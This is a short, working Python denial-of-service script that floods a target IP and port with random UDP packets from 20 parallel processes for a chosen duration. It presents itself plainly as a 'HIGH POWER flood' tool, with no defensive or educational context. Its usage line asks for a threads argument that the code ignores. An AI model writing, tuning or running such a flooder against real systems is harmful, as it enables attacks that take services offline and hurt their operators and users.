import socket
import multiprocessing
import time
import sys
import random

def flood(target, port, duration):
    # Prepare a random packet of 1024 bytes
    data = random._urandom(1024)
    end_time = time.time() + duration
    
    # Use a faster loop by checking time less frequently
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        if time.time() > end_time:
            break
        for _ in range(100): # Send 100 packets before checking time again
            try:
                client.sendto(data, (target, port))
            except:
                pass
    client.close()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 flood.py <target> <port> <time> <threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration_secs = int(sys.argv[3])
    num_processes = 20  # Use 20 processes for maximum power

    print(f"Starting HIGH POWER flood on {target_ip}:{target_port} for {duration_secs} seconds...")
    
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=flood, args=(target_ip, target_port, duration_secs))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
    print("Flood finished.")
